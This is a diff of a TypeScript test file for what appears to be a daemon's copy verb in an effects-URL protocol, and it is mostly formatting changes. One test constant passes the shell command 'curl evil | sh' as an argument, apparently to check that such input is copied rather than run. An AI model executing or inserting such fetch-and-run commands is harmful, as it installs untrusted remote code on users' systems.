@@ -12,21 +12,25 @@ import { URL_FRAME_VERSION } from "../src/daemon/foundations/protocol";
 import { systemTimekeeper } from "../src/time";
 import { clickParts } from "./helpers/click-parts";
 import type { LaunchResult } from "../src/proc/launcher";
-import { testVerbContext,
-  actingWorld } from "./helpers/click";
+import { testVerbContext, actingWorld } from "./helpers/click";
 import { TEST_SIGNER } from "./helpers/link-signer";
 
 const COPY = effectsUrl([{ verb: VERB_COPY, args: ["curl evil | sh"] }]);
 
 function host(
   copying: Promise<void> = Promise.resolve(),
-  copies: LaunchResult = { ok: true, stdout: "", stderr: "", exitCode: 0 } as LaunchResult,
+  copies: LaunchResult = {
+    ok: true,
+    stdout: "",
+    stderr: "",
+    exitCode: 0,
+  } as LaunchResult,
 ) {
   const copied: string[] = [];
   const unheard: string[] = [];
   const {
     arrival: _a,
-    latest: _l,
+    context: _c,
     effects: _e,
     ...verbCtx
   } = testVerbContext(new SessionState());
